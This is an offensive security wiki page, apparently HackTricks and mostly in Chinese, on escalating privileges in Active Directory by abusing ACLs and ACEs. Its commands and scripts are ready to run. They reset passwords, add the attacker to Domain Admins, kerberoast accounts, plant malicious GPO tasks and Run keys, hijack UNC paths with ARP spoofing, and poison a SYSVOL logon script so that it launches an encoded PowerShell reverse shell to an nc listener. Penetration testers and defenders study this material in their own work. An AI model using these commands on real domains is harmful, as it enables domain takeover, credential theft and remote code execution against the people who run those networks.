# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**此页主要是对以下技术的总结** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **以及** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**的总结。更多细节请查看原始文章。**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

这个权限允许攻击者完全控制目标用户账户。一旦使用 `Get-ObjectAcl` 命令确认了 `GenericAll` 权限，攻击者可以：

- **Change the Target's Password**: 使用 `net user <username> <password> /domain`，攻击者可以重置该用户的密码。
- From Linux, you can do the same over SAMR with Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **如果账户被禁用，清除 UAC 标志**：`GenericAll` 允许编辑 `userAccountControl`。在 Linux 下，BloodyAD 可以移除 `ACCOUNTDISABLE` 标志：
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: 为用户的账户分配一个 SPN，使其可被 kerberoast，然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解票据授予票据（TGT）哈希。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**：为该用户禁用预身份验证，使其账户容易受到 ASREPRoasting 攻击。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: 使用 `GenericAll` 在某个用户上，你可以添加基于证书的 credential，并在不更改其密码的情况下以该用户身份进行身份验证。参见：

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group 上的 GenericAll Rights**

如果攻击者对像 `Domain Admins` 这样的 group 拥有 `GenericAll` rights，这项特权允许攻击者操纵 group memberships。在使用 `Get-NetGroup` 确定该 group 的 distinguished name 之后，攻击者可以：

- **将自己添加到 Domain Admins Group**：这可以通过直接命令或使用 Active Directory 或 PowerSploit 等 modules 来完成。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- 从 Linux，你也可以利用 BloodyAD 在你对某个组持有 GenericAll/Write membership 时将自己添加到任意组中。如果目标组嵌套在 “Remote Management Users” 中，你将立即获得对遵循该组的主机的 WinRM 访问权限：
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

在 computer 对象或 user account 上拥有这些权限，可以实现：

- **Kerberos Resource-based Constrained Delegation**：允许接管一个 computer 对象。
- **Shadow Credentials**：利用创建 shadow credentials 的权限来冒充 computer 或 user account。

## **WriteProperty on Group**

如果用户对特定 group 的所有对象拥有 `WriteProperty` 权限（例如 `Domain Admins`），他们可以：

- **将自己添加到 Domain Admins Group**：可通过结合 `net user` 和 `Add-NetGroupUser` 命令实现，这种方法允许在 domain 内进行 privilege escalation。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

此权限使攻击者能够通过直接操纵组成员身份的命令，将自己添加到特定组中，例如 `Domain Admins`。使用以下命令序列可以实现自我添加：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

类似的权限，这允许攻击者如果对这些组拥有 `WriteProperty` 权限，就可以通过修改组属性直接将自己添加到组中。该权限的确认和执行可通过以下方式完成：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

在用户上持有 `User-Force-Change-Password` 的 `ExtendedRight` 允许在不知道当前密码的情况下重置密码。可以通过 PowerShell 或其他命令行工具来验证并利用该权限，提供多种重置用户密码的方法，包括交互式会话以及适用于非交互环境的 one-liner。命令范围从简单的 PowerShell 调用到在 Linux 上使用 `rpcclient`，展示了攻击向量的多样性。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group 上的 WriteOwner**

如果攻击者发现他们对某个 group 拥有 `WriteOwner` 权限，就可以将该 group 的所有权改为自己。这在目标 group 是 `Domain Admins` 时尤其有影响，因为更改所有权后，可以对 group 的属性和成员资格进行更广泛的控制。这个过程包括通过 `Get-ObjectAcl` 识别正确的对象，然后使用 `Set-DomainObjectOwner` 通过 SID 或名称来修改 owner。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **用户上的 GenericWrite**

此权限允许攻击者修改用户属性。具体来说，使用 `GenericWrite` 访问权限时，攻击者可以将某个用户的登录脚本路径更改为在用户登录时执行恶意脚本。这可以通过使用 `Set-ADObject` 命令来更新目标用户的 `scriptpath` 属性，使其指向攻击者的脚本来实现。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **Group 上的 GenericWrite**

拥有此权限后，攻击者可以操纵 group 成员关系，例如将自己或其他用户添加到特定 group 中。这个过程包括创建一个 credential object，使用它来向 group 中添加或移除用户，并通过 PowerShell commands 验证成员关系变更。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- 在 Linux 上，当你对该组拥有 `GenericWrite` 时，Samba `net` 可以添加/移除成员（当 PowerShell/RSAT 不可用时很有用）：
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

拥有一个 AD 对象并对其具有 `WriteDACL` 权限，攻击者就能够为自己授予该对象的 `GenericAll` 权限。这是通过 ADSI 操作实现的，从而可以完全控制该对象，并具备修改其组成员关系的能力。尽管如此，在尝试使用 Active Directory 模块的 `Set-Acl` / `Get-Acl` cmdlets 利用这些权限时，仍然存在一些限制。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner 快速接管 (PowerView)

当你对某个 user 或 service account 拥有 `WriteOwner` 和 `WriteDacl` 时，你可以完全控制它，并使用 PowerView 重置其密码，而无需知道旧密码：
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
注意：
- 如果你只有 `WriteOwner`，你可能需要先将所有者改为自己：
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- 在重置密码后，使用任意协议（SMB/LDAP/RDP/WinRM）验证访问。

## **域上的复制 (DCSync)**

DCSync attack 利用域上的特定复制权限来模拟 Domain Controller 并同步数据，包括用户凭据。这个强大的 technique 需要像 `DS-Replication-Get-Changes` 这样的权限，允许攻击者在不直接访问 Domain Controller 的情况下从 AD 环境中提取敏感信息。 [**在这里了解更多关于 DCSync attack。**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

委派管理 Group Policy Objects (GPOs) 的访问权限会带来重大的安全风险。例如，如果像 `offense\spotless` 这样的用户被委派了 GPO 管理权限，他们可能拥有 **WriteProperty**、**WriteDacl** 和 **WriteOwner** 等权限。这些权限可被滥用用于恶意目的，可通过 PowerView 识别：`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### 枚举 GPO Permissions

要识别配置错误的 GPOs，可以将 PowerSploit 的 cmdlets 串联起来。这可以发现某个特定用户有权限管理的 GPOs：`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**应用了给定 Policy 的 Computers**：可以解析某个特定 GPO 应用于哪些 computers，这有助于理解潜在影响范围。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**应用于给定 Computer 的 Policies**：要查看应用到某台特定 computer 的 policies，可以使用 `Get-DomainGPO` 之类的命令。

**应用了给定 Policy 的 OUs**：可以使用 `Get-DomainOU` 来识别受某个给定 policy 影响的 organizational units (OUs)。

你也可以使用工具 [**GPOHound**](https://github.com/cogiceo/GPOHound) 来枚举 GPOs 并查找其中的问题。

### Abuse GPO - New-GPOImmediateTask

配置错误的 GPOs 可以被利用来执行 code，例如，通过创建一个 immediate scheduled task。这样可以在受影响的 machines 上把某个 user 添加到本地 administrators group，从而显著提升权限：
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

如果已安装，GroupPolicy 模块允许创建并链接新的 GPO，还可以设置诸如注册表值之类的首选项，以在受影响的计算机上执行 backdoors。此方法要求 GPO 已更新，并且有用户登录到计算机后才能执行：
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse 提供了一种通过添加任务或修改设置来 abuse 现有 GPO 的方法，无需创建新的 GPO。这个工具需要修改现有 GPO，或者在应用更改前使用 RSAT 工具创建新的 GPO：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制更新策略

GPO 更新通常大约每 90 分钟发生一次。为了加快这个过程，尤其是在实施更改之后，可以在目标计算机上使用 `gpupdate /force` 命令来强制立即更新策略。该命令可确保对 GPO 的任何修改都会被应用，而无需等待下一次自动更新周期。

### Under the Hood

检查某个 GPO 的 Scheduled Tasks，例如 `Misconfigured Policy` 时，可以确认诸如 `evilTask` 之类任务的添加。这些任务是通过脚本或命令行工具创建的，目的是修改系统行为或提升权限。

如 `New-GPOImmediateTask` 生成的 XML 配置文件所示，任务结构概述了 Scheduled Task 的具体信息——包括要执行的命令及其触发器。该文件代表了 Scheduled Tasks 在 GPO 中的定义和管理方式，提供了一种将任意命令或脚本作为策略执行一部分的方法。

### Users and Groups

GPO 还允许对目标系统上的用户和组成员关系进行操作。通过直接编辑 Users and Groups policy 文件，攻击者可以将用户添加到特权组中，例如本地 `administrators` 组。这可以通过委派 GPO 管理权限来实现，从而允许修改 policy 文件，以包含新用户或更改组成员关系。

Users and Groups 的 XML 配置文件概述了这些更改如何实现。通过向该文件添加条目，可以在受影响的系统上授予特定用户提升后的权限。此方法提供了一种通过 GPO 操作进行权限提升的直接途径。

此外，还可以考虑其他用于执行代码或维持持久化的方法，例如利用 logon/logoff scripts、修改用于 autoruns 的 registry keys、通过 .msi 文件安装软件，或编辑 service 配置。这些技术为通过滥用 GPO 来维持访问和控制目标系统提供了多种途径。

### WriteGPLink + UNC path hijacking (ARP spoofing)

在 OU/domain 上使用 `WriteGPLink` 可以让你修改目标容器的 `gPLink` 属性，并且**强制现有 GPO 被应用**，而无需修改 GPO 本身。当已链接的 GPO 已经引用通过 **UNC paths**（`\\HOST\share\...`）提供的远程内容时，这就变得很有价值，因为经过身份验证的用户可以读取 **SYSVOL** 并离线寻找可复用的策略。

高级流程：

1. 使用 BloodHound 识别在某个 OU 上拥有 `WriteGPLink` 的主体，并枚举该 OU 内的计算机/用户。
2. 只读方式克隆 `SYSVOL`，并解析 GPO，查找引用 UNC paths 的 **Software Installation**、**drive mappings**（`Drives.xml`）以及 **logon/startup scripts**。
3. 优先选择指向**直接主机名**的策略（例如 `\\DC02\share\pkg.msi`），而不是 DFS/domain-namespace 路径，因为基于主机名的路径更容易通过 L2 spoofing 重定向。
4. 将选定的 GPO GUID 追加到目标 OU 的 `gPLink` 中，使受害者处理那个已经存在的 policy。
5. 在同一广播域内，对 UNC 主机进行 ARP spoofing，并在本地绑定其 IP（`ip addr add <target_ip>/32 dev <iface>`），这样受害者的 SMB 流量就会到达你的主机。
6. 使用攻击者的 SMB server（例如 `smbserver.py`）提供预期的路径/文件名，并等待正常的策略处理。

示例 `SYSVOL` 收集与 GPO 关联：
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
将现有的 GPO 链接到目标 OU：
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

如果链接的 GPO 从 UNC 路径部署一个 MSI，客户端会在 **computer startup** 期间获取它，并以 **`NT AUTHORITY\SYSTEM`** 身份安装。通过伪造引用的主机，并在 **相同的 share/path/name** 下提供一个恶意 MSI，你可以把 `WriteGPLink` 变成 SYSTEM 代码执行，**而不需要修改 SYSVOL**。

重要限制：

- **Timing matters**：新链接会在 policy refresh 时被看到（通常约 90 分钟），但 **Software Installation** 通常在 **reboot** 时触发。
- Windows Installer 通常使用包的 **`ProductCode`** 跟踪部署。如果该产品已经安装，部署可能会被跳过。
- 为了避免 installer 拒绝，修改 rogue MSI，使其 **`ProductCode`** 和 **`PackageCode`** 与 GPO 预期的合法包匹配。
- 旧的 `.aas` advertisement 文件可能仍保留在 `SYSVOL` 中，所以在依赖它之前，先确认该部署仍然看起来是 active。
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` 会在 logon 或重新连接时让用户对配置的 UNC 路径进行 authentication。若你伪造所引用的主机，就可以捕获 **NetNTLMv2**。如果故意让 SMB 失败，Windows 可能会改用 **WebDAV** 重试，通过 **HTTP** 发送 **NTLM**，这对转发到 **LDAP(S)**、**AD CS** 或 **SMB** 更加灵活。

#### Logon/startup script UNC hijack

同样的模式也适用于在 `SYSVOL` 中发现的基于 UNC 的 scripts：

- **Logon scripts** 通常在 **user** 上下文中执行。
- **Startup scripts** 通常在 **computer / SYSTEM** 上下文中执行。

如果 script path 指向一个可伪造的 hostname，重定向 UNC host，并在预期位置提供替换后的 script content。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` 或 `\\<dc>\NETLOGON\` 下的可写路径允许篡改通过 GPO 在 user logon 时执行的 logon scripts。这会在登录用户的 security context 中实现 code execution。

### Locate logon scripts
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- 爬取 domain shares 以发现指向 scripts 的 shortcuts 或 references:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- 解析 `.lnk` files 以解析指向 SYSVOL/NETLOGON 的 targets（对 DFIR 很有用，也是没有直接 GPO access 的 attackers 的技巧）：
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound 在用户节点上会显示 `logonScript`（scriptPath）属性（如果存在）。

### 验证写入权限（不要相信共享列表）
自动化工具可能会把 SYSVOL/NETLOGON 显示为只读，但底层的 NTFS ACL 仍可能允许写入。务必进行测试：
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
如果文件大小或 mtime 发生变化，则说明你有写权限。在修改前保留原始内容。

### 毒化一个 VBScript 登录脚本以实现 RCE
追加一条会启动 PowerShell reverse shell（从 revshells.com 生成）的命令，并保留原始逻辑以避免破坏业务功能：
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
在你的主机上监听并等待下一次交互式登录：
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- Execution happens under the logging user’s token (not SYSTEM). Scope is the GPO link (OU, site, domain) applying that script.
- Clean up by restoring the original content/timestamps after use.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
